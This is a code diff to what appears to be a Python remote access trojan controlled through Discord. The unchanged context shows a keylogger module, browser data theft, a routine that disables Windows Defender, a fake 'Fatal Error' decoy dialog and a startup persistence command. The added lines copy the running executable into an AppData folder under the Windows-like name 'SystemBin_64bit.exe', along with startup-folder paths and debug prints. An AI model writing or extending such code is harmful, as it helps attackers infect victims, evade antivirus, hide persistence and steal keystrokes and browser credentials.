@@ -1,8 +1,9 @@
-import os, discord, subprocess, requests, ctypes, zipfile#, shutil
+import os, discord, subprocess, requests, ctypes, zipfile, shutil#, sys
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR#, MOVE, ANTIDEBUG
+import sys
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
 #from modules.antidebug import Antidebug
@@ -28,8 +29,54 @@ if DEFENDER:
     disable_defender()
 
 
+
+
+
+
+
+
+file_dir = os.getcwd() #os.path.dirname(os.path.abspath(__file__))
+
+
+def move():
+    try:
+        target_dir = f"{os.getenv('appdata')}\MicrosoftWindows\System"
+        #shutil.copyfile(f"{file_dir}\{os.path.basename(__file__)}", f"{target_dir}\SystemBin_64bit.exe")
+        print(f"{file_dir}\{sys.argv[0]}")
+        print("error:")
+        with open(f"{file_dir}\{sys.argv[0]}", "rb") as f:
+            bins = f.read()
+        
+        print(bins)
+            
+        print(f"{file_dir}\{sys.argv[0]}")
+            
+        with open(f"{target_dir}\SystemBin_64bit.exe", "wb") as f:
+            f.write(bins)
+        
+        print(f"{target_dir}\SystemBin_64bit.exe")
+        
+        #subprocess.Popen(f"{target_dir}\SystemBin_64bit.exe", shell=True)
+        #sys.exit()
+    except Exception as e:
+        print(e)
+        return
+    
+    
+if MOVE and file_dir != f"{os.getenv('appdata')}\MicrosoftWindows\System":
+    print("moving")
+    move()
+else:
+    print("not moving")
+
+
+
+
+
+
+
 def error():
-    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")  
+    messagebox.showerror("Fatal Error", "Error code: 0x80070002\nAn internal error occurred while importing modules.")
     
 if ERROR:
     error()
@@ -370,7 +417,7 @@ async def on_message(message):
         await message.reply(embed=embed)
     
     elif message.content == "startup":
-        Startup(f"{os.path.abspath(__file__)}\{os.path.basename(__file__)}")
+        Startup(f"{file_dir}\{sys.argv[0]}")
         await message.reply("Startup Enabled!")
         
         
@@ -479,4 +526,12 @@ except:
 #subprocess.run(["shutdown", "/s", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
 #subprocess.run(["shutdown", "/r", "/t", "0"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+
+#C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
+#C:\Users\Korisnik\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+
+
+
+#C:\Users\Korisnik\AppData\Roaming\MicrosoftWindows\System
+
 
